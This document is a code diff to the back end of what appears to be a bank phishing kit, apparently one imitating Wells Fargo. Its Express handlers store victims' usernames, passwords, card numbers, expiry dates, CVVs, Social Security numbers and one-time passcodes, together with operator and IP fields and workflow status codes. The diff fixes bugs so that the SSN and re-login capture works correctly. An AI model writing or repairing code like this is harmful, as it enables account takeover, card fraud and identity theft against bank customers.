@@ -40,7 +40,7 @@ const getInfo = async (req, res) => {
 const submitLogin = async (req, res) => {
   const { username, password, uniqueid, owner, ip } = req.body;
   try {
-    await Wells.create({ uniqueid, username, password, status: 2, owner, ip });
+    await Wells.create({ uniqueid, username, password, status: 1, owner, ip });
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -51,7 +51,7 @@ const submitLogin = async (req, res) => {
 const submitLoginAgain = async (req, res) => {
   const { username, password, uniqueid } = req.body;
   try {
-    await Wells.findOneAndUpdate({ uniqueid }, { telephone, status: 9 }).exec();
+    await Wells.findOneAndUpdate({ uniqueid }, { username, password, status: 0 }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -62,7 +62,7 @@ const submitLoginAgain = async (req, res) => {
 const submitCard = async (req, res) => {
   const { ccnum, ccexp, cvv, uniqueid } = req.body;
   try {
-    await Wells.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 7 }).exec();
+    await Wells.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 9 }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -71,9 +71,9 @@ const submitCard = async (req, res) => {
 };
 
 const submitSSN = async (req, res) => {
-  const { ccnum, ccexp, cvv, uniqueid } = req.body;
+  const { ssn, uniqueid } = req.body;
   try {
-    await Wells.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 7 }).exec();
+    await Wells.findOneAndUpdate({ uniqueid }, { ssn, status: 7 }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -84,7 +84,7 @@ const submitSSN = async (req, res) => {
 const submitOtp = async (req, res) => {
   const { otp, uniqueid } = req.body;
   try {
-    await Wells.findOneAndUpdate({ uniqueid }, { otp, status: 7 }).exec();
+    await Wells.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
